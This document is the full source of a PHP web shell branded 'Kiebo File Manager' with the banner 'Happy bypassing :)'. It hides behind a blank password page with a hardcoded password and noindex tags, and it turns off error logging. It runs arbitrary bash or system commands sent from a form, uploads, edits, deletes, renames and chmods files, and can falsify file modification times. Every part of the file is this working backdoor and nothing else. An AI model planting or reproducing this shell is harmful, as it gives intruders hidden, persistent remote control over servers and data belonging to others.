<?php

error_reporting(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
session_start();
$passwd = "desah";
if($_POST['pass']) {
  if($_POST['passwd'] == $passwd) {
    $_SESSION['masuk'] = "masuk";
    header("Location: ?");
  }
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  header("Location: ?");
}
if(empty($_SESSION['masuk'])) {
?>
<title></title>
<meta name="robots" content="noindex, nofollow">
<meta name="googlebot" content="noindex, nofollow">
<meta name="bingbot" content="noindex, nofollow">
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<style>
  html {
    background: #000;
    color: #000;
  }
  input {
    background: transparent;
    color: #F8F8F2;
    border: 1px solid #A4FFFF;
  }
  @media only screen and (max-width:800px){
     html{
        font-size:20px;
     }
  }
</style>
<center>
<p>
<table height="100%" width="100%">
  <td align="center">
    <br><br>
    <form enctype="multipart/form-data" method="post">
      <input type="password" name="passwd">
      <input type="submit" name="pass" value=">>">
    </form>
  </td>
</table>
<?php
exit();
}

@set_time_limit(0);
@error_reporting(0);
define('_B_', realpath(isset($_GET['_r']) ? $_GET['_r'] : getcwd()));
chdir(_B_);

function _g($p){ return realpath($p); }
function _p($f){ return substr(sprintf('%o', fileperms($f)), -4); }
function _pm($f){
    $m = fileperms($f); $s = ($m & 0x4000) ? 'd' : '-';
    $x = [0x0100=>'r', 0x0080=>'w', 0x0040=>'x', 0x0020=>'r', 0x0010=>'w', 0x0008=>'x', 0x0004=>'r', 0x0002=>'w', 0x0001=>'x'];
    foreach($x as $b=>$c){ $s .= ($m & $b) ? $c : '-'; }
    return $s;
}
function _go(){ header('Location:?_r='.urlencode(_B_)); exit; }

if(isset($_GET['_x'])){
    $t = _g($_GET['_x']);
    if(is_file($t)) unlink($t);
    elseif(is_dir($t)) rmdir($t);
    _go();
}

if(isset($_POST['_rf'], $_POST['_rt'])){
    rename(_g($_POST['_rf']), dirname($_POST['_rf']).'/'.$_POST['_rt']);
    _go();
}

if(isset($_POST['_cp'], $_POST['_cm'])){
    chmod(_g($_POST['_cp']), intval($_POST['_cm'], 8));
    _go();
}

if(isset($_POST['_ep'], $_POST['_ed'])){
    file_put_contents($_POST['_ep'], $_POST['_ed']);
    echo "<div style='color:lime'>✓ Saved</div>";
}

if(!empty($_FILES['_uf'])){
    move_uploaded_file($_FILES['_uf']['tmp_name'], _B_.'/'.$_FILES['_uf']['name']);
    echo "<div style='color:lime'>✓ Uploaded</div>";
}

if(isset($_POST['_mkdir']) && $_POST['_mkdir']){
    $folder = basename(trim($_POST['_mkdir']));
    @mkdir(_B_ . '/' . $folder);
    _go();
}

if(isset($_POST['_mkfile']) && $_POST['_mkfile']){
    $file = basename(trim($_POST['_mkfile']));
    $path = _B_ . '/' . $file;
    if (!file_exists($path)) {
        file_put_contents($path, '');
    }
    _go();
}

if(isset($_POST['_tp'], $_POST['_tm'])){
    @touch(_g($_POST['_tp']), strtotime($_POST['_tm']));
    _go();
}

$__ = '';
if (isset($_POST['_sh'])) {
    $cmd = $_POST['_sh'];
    ob_start();
    if (stristr(PHP_OS, 'WIN')) {
        system($cmd);
    } else {
        putenv('PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
        $descriptorspec = [
            0 => ["pipe", "r"],
            1 => ["pipe", "w"],
            2 => ["pipe", "w"]
        ];
        $process = proc_open("/bin/bash", $descriptorspec, $pipes);
        if (is_resource($process)) {
            fwrite($pipes[0], $cmd . "\n");
            fclose($pipes[0]);
            echo stream_get_contents($pipes[1]);
            fclose($pipes[1]);
            echo stream_get_contents($pipes[2]);
            fclose($pipes[2]);
            proc_close($process);
        } else {
            echo "❌ Failed to open bash shell.";
        }
    }
    $__ = ob_get_clean();
}

$__dir = $__file = [];
foreach(scandir(_B_) as $_){
    if($_=='.') continue;
    $p = _B_.'/'.$_;
    is_dir($p) ? $__dir[] = $_ : $__file[] = $_;
}
?>
<!DOCTYPE html><html><head>
<meta charset="utf-8">
<title></title>
<style>
body{background:#111;color:#ccc;font:12px monospace;}
a{color:#0af;text-decoration:none;}
input,button,textarea{background:#1d1d1d;color:#ccc;border:1px solid #333;padding:3px;}
table{width:100%;border-collapse:collapse;margin-top:10px;}
td,th{border:1px solid #333;padding:4px;}
</style></head>
<body>
<h3># Kiebo File Manager<br># version : v.1.0/2025<br># Happy bypassing :)</h3>
<h3>📁 PATH:
<?php
$z=explode(DIRECTORY_SEPARATOR,_B_);
$p=PHP_OS_FAMILY==='Windows'?'':'/';
foreach($z as $i){if($i==='')continue;$p.=$i.'/';echo "<a href='?_r=".urlencode($p)."'>/$i</a>";}
?>
</h3>

<form method="post" enctype="multipart/form-data">
<input type="file" name="_uf">
<button>Upload</button>
</form>

<form method="post" style="margin-top:10px;">
<input name="_sh" style="width:60%" placeholder="Execute Shell">
<button>Run</button>
</form>

<form method="post" style="margin-top:10px;">
<input name="_mkdir" placeholder="New Folder Name">
<button>Create Folder</button>
</form>

<form method="post" style="margin-top:10px;">
<input name="_mkfile" placeholder="New File Name">
<button>Create File</button>
</form>

<?php if($__): ?><pre><?=htmlspecialchars($__)?></pre><?php endif; ?>

<table>
<tr><th>Name</th><th>Type</th><th>Size</th><th>Perm</th><th>Modified</th><th>Action</th></tr>
<?php foreach($__dir as $_): $p=_g(_B_.'/'.$_); ?>
<tr>
<td><a href="?_r=<?=urlencode($p)?>">📁 <?=htmlspecialchars($_)?></a></td>
<td>DIR</td><td>-</td><td><?=_pm($p)?></td>
<td><?=date('Y-m-d H:i:s', filemtime($p))?></td>
<td>
<form method="post" style="display:inline;">
<input type="hidden" name="_rf" value="<?=$p?>">
<input name="_rt" placeholder="Rename"><button>R</button></form>
<form method="post" style="display:inline;">
<input type="hidden" name="_cp" value="<?=$p?>">
<input name="_cm" size="4" placeholder="<?=_p($p)?>">
<button>C</button></form>
<form method="post" style="display:inline;">
<input type="hidden" name="_tp" value="<?=$p?>">
<input name="_tm" placeholder="<?=date('Y-m-d H:i:s', filemtime($p))?>">
<button>T</button></form>
<a href="?_x=<?=urlencode($p)?>&_r=<?=urlencode(_B_)?>">🗑</a>
</td></tr>
<?php endforeach; ?>

<?php foreach($__file as $_): $p=_g(_B_.'/'.$_); ?>
<tr>
<td><a href="?_r=<?=urlencode(_B_)?>&e=<?=urlencode($p)?>">📄 <?=htmlspecialchars($_)?></a></td>
<td>FILE</td><td><?=filesize($p)?> B</td><td><?=_pm($p)?></td>
<td><?=date('Y-m-d H:i:s', filemtime($p))?></td>
<td>
<form method="post" style="display:inline;">
<input type="hidden" name="_rf" value="<?=$p?>">
<input name="_rt" placeholder="Rename"><button>R</button></form>
<form method="post" style="display:inline;">
<input type="hidden" name="_cp" value="<?=$p?>">
<input name="_cm" size="4" placeholder="<?=_p($p)?>">
<button>C</button></form>
<form method="post" style="display:inline;">
<input type="hidden" name="_tp" value="<?=$p?>">
<input name="_tm" placeholder="<?=date('Y-m-d H:i:s', filemtime($p))?>">
<button>T</button></form>
<a href="?_x=<?=urlencode($p)?>&_r=<?=urlencode(_B_)?>">🗑</a>
</td></tr>
<?php endforeach; ?>
</table>

<?php if(!empty($_GET['e'])):
$fp=_g($_GET['e']);if(is_file($fp)):
$ct=htmlspecialchars(file_get_contents($fp));
?>
<h4>Edit: <?=basename($fp)?></h4>
<form method="post">
<input type="hidden" name="_ep" value="<?=$fp?>">
<textarea name="_ed" rows="20" cols="80"><?=$ct?></textarea><br>
<button>💾 Save</button>
</form>
<?php endif; endif; ?>

</body></html>
